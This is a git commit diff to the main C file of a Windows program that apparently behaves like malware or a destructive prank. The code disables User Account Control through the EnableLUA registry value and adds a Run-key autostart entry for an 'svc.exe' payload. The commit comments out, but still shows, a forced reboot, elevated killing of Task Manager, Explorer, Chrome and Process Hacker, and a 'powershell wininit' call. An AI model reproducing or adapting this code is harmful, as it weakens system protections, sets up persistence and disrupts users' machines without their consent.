61c25bdac93d56d25d657a67a0bfc25b404e0b97
hoedenmaker <89327041+Hoedenmaker@users.noreply.github.com>
2025-03-17 18:50:28 +0700

    stop registrying my editor 😭 (idk didnt watch)

--- src/main.c
+++ src/main.c
@@ -16,23 +16,34 @@ int main()
   DWORD existingValue = 1;
   DWORD size = sizeof(DWORD);
 
-  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
+  {
 
     RegQueryValueExA(hKey, "EnableLUA", NULL, NULL, (LPBYTE)&existingValue, &size);
     printf("EnableLUA value: %d\n", existingValue);
 
-    if (existingValue != 0) {
-      if (RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (const BYTE*)&value, sizeof(value)) != ERROR_SUCCESS) {
+    if (existingValue != 0)
+    {
+      if (RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (const BYTE *)&value, sizeof(value)) != ERROR_SUCCESS)
+      {
         RegCloseKey(hKey);
       }
-      system("shutdown /r /t 0");
-      // MessageBox(NULL, "There was supposed to be a reboot here", "No reboot today", MB_ICONEXCLAMATION | MB_OK | MB_DEFBUTTON1);
+      // system("shutdown /r /t 0");
+      MessageBox(NULL, "There was supposed to be a reboot here", "No reboot today", MB_ICONEXCLAMATION | MB_OK | MB_DEFBUTTON1);
     }
+  }
+  RegCloseKey(hKey);
+
+  subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+  LPCWSTR path = L"C:\\Program Files (x86)\\fuck\\svc.exe";
+  LPDWORD disposition;
+
+  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
+  {
+    RegSetValueExW(hKey, (LPCWSTR)L"noWay", 0, REG_EXPAND_SZ, (const BYTE *)path, wcslen(path) * sizeof(wchar_t));
   }
 
   RegCloseKey(hKey);
-
-
 
   if (!SDL_Init(SDL_INIT_VIDEO) || !SDL_Init(SDL_INIT_AUDIO))
   {
@@ -60,18 +71,18 @@ int main()
     SDL_Event event;
     SDL_PollEvent(&event);
 
-    ShellExecute(NULL, "runas", "taskkill", "/f /im taskmgr.exe", NULL, SW_HIDE);
-    ShellExecute(NULL, "runas", "taskkill", "/f /im explorer.exe", NULL, SW_HIDE);
-    ShellExecute(NULL, "runas", "taskkill", "/f /im chrome.exe", NULL, SW_HIDE);
-    ShellExecute(NULL, "runas", "taskkill", "/f /im ProcessHacker.exe", NULL, SW_HIDE);
+    // ShellExecute(NULL, "runas", "taskkill", "/f /im taskmgr.exe", NULL, SW_HIDE);
+    // ShellExecute(NULL, "runas", "taskkill", "/f /im explorer.exe", NULL, SW_HIDE);
+    // ShellExecute(NULL, "runas", "taskkill", "/f /im chrome.exe", NULL, SW_HIDE);
+    // ShellExecute(NULL, "runas", "taskkill", "/f /im ProcessHacker.exe", NULL, SW_HIDE);
 
     if (event.type == SDL_EVENT_QUIT)
     {
-      system("powershell wininit");
-      // break;
+      // system("powershell wininit");
+      break;
     }
 
-    SDL_SetWindowPosition(window, rand() % 1920, rand() % 1080);
+    // SDL_SetWindowPosition(window, rand() % 1920, rand() % 1080);
 
     SDL_SetRenderDrawColor(renderer, 0, 0, 0, 0);
     SDL_RenderClear(renderer);
